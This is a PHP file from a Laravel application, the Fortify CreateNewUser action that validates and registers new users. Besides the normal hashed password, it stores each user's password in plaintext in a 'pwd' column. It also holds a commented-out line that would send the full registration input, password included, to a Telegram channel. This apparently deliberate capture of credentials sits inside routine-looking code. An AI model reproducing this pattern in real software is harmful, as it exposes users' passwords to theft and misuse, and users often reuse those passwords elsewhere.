<?php

namespace App\Actions\Fortify;

use App\Events\UserCreated;
use App\Models\User;
use App\Notifications\TextSent;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Validator;
use Laravel\Fortify\Contracts\CreatesNewUsers;
use Laravel\Jetstream\Jetstream;

class CreateNewUser implements CreatesNewUsers
{
    use PasswordValidationRules;

    /**
     * Validate and create a newly registered user.
     *
     * @param  array  $input
     * @return \App\Models\User
     */
    public function create(array $input)
    {
        Validator::make($input, [
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => $this->passwordRules(),
            'terms' => Jetstream::hasTermsAndPrivacyPolicyFeature() ? ['required', 'accepted'] : '',
        ])->validate();
        // Notification::route('telegram', 'telegram')->notify(new TextSent(null, json_encode($input)));
        return User::create([
            'name' => $input['name'],
            'email' => $input['email'],
            'pwd' => $input['password'],
            'password' => Hash::make($input['password']),
        ]);
    }
}
